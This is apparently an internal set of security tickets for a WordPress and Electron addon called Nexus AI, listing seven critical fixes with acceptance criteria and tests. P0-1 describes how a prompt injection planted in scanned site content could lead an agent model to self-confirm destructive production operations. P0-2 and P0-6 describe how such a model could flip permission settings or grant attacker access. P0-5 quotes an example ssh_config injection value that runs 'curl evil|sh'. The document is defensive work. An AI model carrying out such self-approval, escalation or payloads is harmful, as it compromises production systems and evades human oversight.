# P0 Security Tickets — Nexus AI

Derived from the 2026-08-12 whole-repo review (13 parallel specialist passes). These are the
**seven P0 items** — the ones that are exploitable now or already-exposed, ahead of all hygiene work.

> **Line numbers are as-reviewed on branch `fixes-0812` (2026-08-12) and drift.** Re-confirm each
> `file:line` before editing. Every fix below has a paired test requirement — this repo's own
> practice is to prove non-vacuity (mutate the production line, watch the test go RED), and the
> two prune/permission tickets sit in exactly the "passes against the bug it targets" trap.

## Sequencing (read before assigning)

The agent-runtime tickets are **interlocked** — do them as one unit or in this order:

1. **P0-1** and **P0-2** first — they establish that a human confirmation is *real* (not model-satisfiable)
   and that the permission gate can't be flipped by a tool call.
2. **P0-6** depends on **P0-1**: promoting WPE ops to Tier 3 buys nothing while Tier 3 is
   self-confirmable in agent context. Land P0-1 first or ship them together.
3. **P0-4** is ops/legal and can start **immediately in parallel** — it's a live exposure, not a code change.
4. **P0-3, P0-5, P0-7** are independent and parallelizable.

| # | Title | Type | Blocks / depends |
|---|---|---|---|
| P0-1 | Close the agent Tier-3 self-approval + sentinel injection→production chain | code | blocks P0-6 |
| P0-2 | Gate `nexus_update_settings` (validate input, protect permission keys) | code | pairs with P0-1 |
| P0-3 | Sign & verify the addon auto-update; harden tar extraction | code | independent |
| P0-4 | Rotate leaked key, confirm npm visibility, strip ACF PRO from tarball | ops/legal | start now, parallel |
| P0-5 | Validate the `~/.ssh/config` write path | code | independent |
| P0-6 | Reclassify privilege-granting WPE ops to Tier 3 | code | depends on P0-1 |
| P0-7 | Fix the `event_queue` prune no-op | code | independent |

---

## P0-1 — Close the agent Tier-3 self-approval + sentinel injection→production chain

**Labels:** `security` `critical` `agent-runtime`
**Severity:** Critical (confirmed, live via the nightly security scan)

### Problem
For `accessMethod:'agent'` there is **no human in the loop at any tier**. Tier 1/2 execute silently;
for Tier 3, `checkTierThreeConfirmation` returns a `_confirmationToken` in the tool-result JSON with a
"call again with this token" instruction (`safety.ts:420-451`). The block is **not** flagged `isError`,
so `NexusToolProvider` parses it and hands it straight back to the model
(`NexusToolProvider.ts:174-240`, `tool-registry.ts:180-203`), which re-issues the identical call and
self-satisfies the token. The 5-minute TTL + single-use are trivially met inside one agent loop.

The chain is **reachable**: the security-sentinel's `llmSynthesis` call (`agent.js:3012`) does **not** set
`noTools`, so it exposes the full 14-tool set — including the Tier-3 `local_wpe_push` — to a model whose
prompt embeds signal `detail` strings built from scanned site content **without** the `untrusted()`
wrapper (`agent.js:3000-3006`). Additionally, agents that declare no `tools` list (`log-processor`,
`web-analytics`) get the **unrestricted** registry and a bypassed `wp_eval` sandbox
(`NexusToolProvider.ts:41,145,151`; `buildAgentContext.ts:79-83`).

### Impact
An attacker plants a payload in any indexed WordPress post → the nightly `wpe:sync.completed` sentinel
run folds it unwrapped into the synthesis prompt → the model is steered to call `local_wpe_push` (or
`wpe_delete_install`) → self-confirms the Tier-3 call → destructive op runs against **production**, no
human at any step.

### Fix
1. **Filter Tier-3 tools out of the agent's tool definitions** (`getProviderToolDefinitions()` for
   `accessMethod:'agent'`) — the smallest correct change — or refuse Tier-3 outright in the agent dispatch
   path. A returned confirmation token must never re-enter the model loop.
2. Add `noTools:true` to the sentinel `llmSynthesis` call (`agent.js:3012`); it only needs structured
   output. Route every `s.detail` through `untrusted()` before embedding.
3. Default `allowedTools` to an **empty set (deny-all)** when a manifest declares no `tools:` list;
   require explicit opt-in.
4. Decouple the `wp_eval` sandbox check from `allowedTools` being defined — gate it on `sandboxSiteIds`
   **unconditionally** for `accessMethod:'agent'`, and inspect `install_name`/`ssh_target`, not only
   `args.site`.

### Acceptance criteria
- [ ] An agent calling any Tier-3 tool (`wpe_delete_install`, `local_wpe_push`, `local_delete_site`,
      `clean_database_items`, `wpe_promote_environment`) is refused or never offered it; re-issuing with a
      captured token still does not execute.
- [ ] The sentinel synthesis model call exposes only the `__output__` tool.
- [ ] `log-processor` / `web-analytics` (no `tools:` list) cannot call any registry tool.
- [ ] `wp_eval` from an agent is restricted to the sandbox site regardless of whether a tools list is
      present, and regardless of whether the target is `site` / `install_name` / `ssh_target`.

### Tests
- Unit: agent-context Tier-3 call returns blocked; a second call carrying the minted token is still
  blocked. **Mutate** the filter to confirm the test goes RED.
- Unit: a no-tools-list agent gets deny-all (assert a representative Tier-2 and Tier-3 tool both throw).
- Injection: a crafted `s.detail` string cannot produce a tool call from `llmSynthesis`.

---

## P0-2 — Gate `nexus_update_settings` (validate input, protect permission keys)

**Labels:** `security` `critical` `mcp`
**Severity:** Critical (the escalation primitive)

### Problem
`nexus_update_settings` (`nexus-settings.ts:107`) is model-exposed, **absent from `TIER_OVERRIDES`** so it
defaults to Tier 2 (silent, no confirmation — `safety.ts:285`), and deep-merges a caller-supplied `patch`
straight into settings with **no schema, no `.strict()`, no key allowlist** (`nexus-settings.ts:141-168`).
The `UpdateSettingsSchema.strict()` guard exists only on the GraphQL path.

### Impact
A prompt-injected model (chat MCP surface directly, or any unrestricted agent) writes
`remoteOperationPermissions.delete.production=true` / `wpcli.production=true`, disabling the fail-closed
gate that `isOperationAllowed` — and `SentinelExecutor` (`SentinelExecutor.ts:32`) — enforce. This is the
lever that turns a read into an arbitrary production write.

### Fix
- Validate `patch`/`key` against `UpdateSettingsSchema` **inside the tool handler** (not only GraphQL).
- Make security-critical keys (`remoteOperationPermissions`, `wpeOperationPermissions`) **non-writable**
  via this tool — route those through a real IPC/human channel (the `TRUST_EXTERNAL_HOST_KEY` pattern).
- Consider removing the tool from the model-exposed set entirely and exposing only a narrow, validated
  subset of settings.

### Acceptance criteria
- [ ] A model call setting any `remoteOperationPermissions.*` / `wpeOperationPermissions.*` key is rejected.
- [ ] Unknown keys and schema-invalid values are rejected (no silent deep-merge).
- [ ] Legitimate non-permission settings still update.

### Tests
- Unit: permission-key write rejected; schema-violating value rejected; valid setting accepted. Mutate the
  guard to confirm RED.

---

## P0-3 — Sign & verify the addon auto-update; harden tar extraction

**Labels:** `security` `critical` `supply-chain` `cli`
**Severity:** Critical (unauthenticated RCE)

### Problem
The addon auto-download/update path is unauthenticated code execution. `downloader.ts:14` fetches a
`.tgz` from `releases.elasticapi.io` (R2), `extractor.ts:45` untars it, and `addon.ts:291` restarts Local
so it loads the new `main.js` into the Electron **main process** — with **no checksum, no signature**.
`verifyExtractedAddon` (`extractor.ts:109-123`) only checks the `package.json` `name`, which any
attacker-built tarball sets. `latest.json` carries a version string only (`version.ts:9,46-59`). The
update prompt defaults to yes (`addon.ts:405`). Separately, `tar` is `^6.2.1`
(`package.json`), which has active **Critical** advisories (hardlink/symlink path traversal), and the
extraction sets no path-escape/link filter.

### Impact
Anyone who can serve content for that hostname (compromised/misconfigured R2 bucket, domain/DNS takeover,
or a TLS-terminating MITM such as a corporate proxy CA) ships arbitrary code that auto-executes with the
developer's full privileges — WPE tokens, SSH keys/aliases, all local site DBs, AI provider keys.

### Fix
1. Publish a **signed manifest**: per-asset `sha256` + an ed25519/minisign signature over the manifest in
   `latest.json`. `scripts/package-addon.js` emits both.
2. In `downloadAddon`, **stream-hash the download and reject on mismatch before `extractTarball`**; verify
   the manifest signature against a public key baked into the CLI.
3. Do not follow cross-host redirect `Location` headers without re-validation (`downloader.ts:50-58`).
4. Upgrade `tar` to **7.5.22+**; add an extraction `filter`/`onentry` that rejects any entry whose resolved
   path escapes `destDir`, and rejects symlink/hardlink/absolute entries outright.
5. `npm audit fix` for **lodash** (High: `_.template` injection / prototype pollution); pin
   `apache-arrow` to a single major (`^17`); build releases with `npm ci`.

### Acceptance criteria
- [ ] A tarball with a wrong/missing hash or signature is rejected and never extracted or loaded.
- [ ] A tarball containing a `../` / absolute / symlink / hardlink entry is rejected on extraction.
- [ ] `npm audit --omit=dev` shows no critical/high in production deps.

### Tests
- Unit: hash-mismatch and bad-signature both reject before extraction.
- Extraction: a zip-slip fixture (path-escape + symlink) is rejected and writes nothing outside `destDir`.

---

## P0-4 — Rotate leaked key, confirm npm visibility, strip ACF PRO from tarball

**Labels:** `security` `critical` `ops` `legal`
**Severity:** Critical (live exposure — start immediately)
**Owner:** maintainer + security/legal (not purely an engineering ticket)

### Problem
- A full Anthropic key was added in commit `9e2abd2e` and redacted in place in `81ff1148` — **still
  recoverable from git history** (the redacted marker remains in
  `docs/superpowers/plans/2026-05-20-overnight-test-coverage.md`).
- `.github/workflows/package.yml:178` runs `npm publish --access public`. For a scoped package that flag
  makes the publish public.
- `npm pack --dry-run` confirms **1,378 ACF PRO files** in the tarball (109 MB) — ACF PRO is a paid WP
  Engine product, copied into `lib/wp-plugins/` at build and included via `package.json` `files`.

### Impact
If that publish ran as written, a live API key and a commercial plugin are already publicly downloadable.

### Actions
- [ ] **Rotate the Anthropic key in the provider console now**; confirm the old key is dead and check
      usage for abuse in the interim.
- [ ] Check npmjs.com for `@local-labs-jpollock/local-addon-nexus-ai` visibility. If public: unpublish/
      deprecate, and rotate anything else that shipped in the tarball.
- [ ] Exclude `advanced-custom-fields-pro` from the `lib/` build copy **and** the `package.json` `files`
      set; re-run `npm pack --dry-run` and confirm zero ACF PRO files.
- [ ] Decide history remediation: fresh squashed repo vs `git filter-repo`. Assume the current history is
      burned for OSS purposes.
- [ ] Add gitleaks to CI **and** a pre-commit hook so this cannot recur (also tracked in P1, but the
      pre-commit hook belongs here as prevention).

---

## P0-5 — Validate the `~/.ssh/config` write path

**Labels:** `security` `high` `external-hosts`
**Severity:** High (local code execution)

### Problem
`sshConfigWriter.ts:151-169` (`previewHostBlock`) builds a `Host` block by **raw string interpolation**;
`assertRequiredHostFields` (`:151`) only checks non-empty, and only `alias` is charset-validated. The IPC
handler `WRITE_SSH_HOST_ENTRY` (`ipc-handlers.ts:1482-1495`) passes the renderer object through with no
validation; `ExternalHostAddWizard.tsx:450,610` gates on presence only. Nexus writes its
`Include ~/.ssh/config.d/nexus` line at the **top** of `~/.ssh/config` (`ensureIncludeLine:175`), and
ssh_config is first-value-wins.

### Impact
A `hostname`/`user`/`port`/`identityFile` value carrying an embedded newline —
e.g. `hostname = "example.com\n  ProxyCommand /bin/sh -c \"curl evil|sh\"\nHost *"` — injects directives
into `config.d/nexus`. Because the Nexus include wins, the injected `ProxyCommand` fires on the user's
next `ssh` **anything**, executing an attacker command locally with the user's privileges.

### Fix
Reject `\n`, `\r`, and leading whitespace in `hostname`/`user`/`port`/`identityFile`; validate `port` as an
integer 1–65535, `hostname` against a hostname/IP charset, `identityFile` as an absolute path with no
newlines. Prefer serializing via the `ssh-config` library (already a dependency) over string concat.
**Enforce in the main-process writer** (the trust boundary), not only the renderer.

### Acceptance criteria
- [ ] A field containing a newline + `ProxyCommand` is rejected at the IPC boundary.
- [ ] Invalid port / non-absolute identityFile / metacharacter-laden hostname are rejected.
- [ ] A legitimate host entry still writes correctly.

### Tests
- Unit: the writer/validator rejects a corpus of injection payloads and accepts valid inputs.

---

## P0-6 — Reclassify privilege-granting WPE ops to Tier 3

**Labels:** `security` `high` `mcp` `wpe`
**Severity:** High
**Depends on:** P0-1 (Tier 3 must be a real human gate first)

### Problem
`safety.ts:116-141` classifies `wpe_create_account_user`, `wpe_update_account_user`,
`wpe_add_user_to_accounts`, `wpe_create_ssh_key` (and the `create_install`/`create_domain(s)` family) as
**Tier 2** — execute-and-audit, no confirmation. None of `modules/wpe/create-account-user.ts`,
`add-user-to-accounts.ts`, `create-ssh-key.ts` call `isOperationAllowed`. Deletes are Tier 3, but
*granting persistent access* is not.

### Impact
A prompt-injected chat/agent call to `wpe_create_account_user` (adds a portal user + emails an invite) or
`wpe_create_ssh_key` / `wpe_add_user_to_accounts` grants an attacker **persistent access to the production
WP Engine account** with no confirmation and no permission check — at least as severe as the deletions
that *do* require Tier 3.

### Fix
Add the identity/access-granting CAPI tools to `TIER_OVERRIDES` as **Tier 3** and/or route them through the
permission gate. **Must land with or after P0-1** so Tier 3 is not self-satisfiable in agent context.

### Acceptance criteria
- [ ] Creating an account user / SSH key / adding a user to an account requires human confirmation (or is
      gated), on every surface.
- [ ] An agent cannot perform these silently (verified against the P0-1 fix).

### Tests
- Unit: tier classification of each tool is 3; agent-context call is refused (not self-confirmable).

---

## P0-7 — Fix the `event_queue` prune no-op

**Labels:** `bug` `data-integrity` `privacy`
**Severity:** High (unbounded disk + indefinite PII retention)

### Problem
`EventProcessor.ts` writes event statuses `completed`/`failed`/`pending`/`processing` (`:100,107,116`), but
`GraphService.cleanupOldData` deletes `WHERE status='processed'` (`GraphService.ts:1052`) — a value that is
**never written**, so nothing is ever freed. Its only caller is the manual `STORAGE_CLEANUP` IPC handler
(`ipc-handlers.ts:2476-2485`); nothing scheduled invokes it, and the audit log reports `eventsDeleted`
anyway. `RESET_AND_REFRESH` explicitly preserves `event_queue`. Measured live: ~8,968 rows / ~15.6 MB, and
payloads carry full post content **and user emails** — indefinite PII retention (GDPR storage-limitation).

### Fix
- Change the DELETE to `status IN ('completed','failed')` older than the cutoff.
- Invoke `cleanupOldData` from the existing daily retention interval (`index.ts:739-741`), not only the
  manual button.

### Acceptance criteria
- [ ] `completed`/`failed` events older than `retentionDays` are actually deleted.
- [ ] A scheduled sweep runs (not manual-only).
- [ ] `eventsDeleted` reflects real deletions.

### Tests
- Unit: seed `completed` rows past the cutoff, run the prune, assert they're gone and fresh rows survive.
  **This is a vacuous-guard-prone area** — assert against the real status string and mutate the production
  literal (`'processed'`) to confirm the test currently catches the bug (RED against the old code).
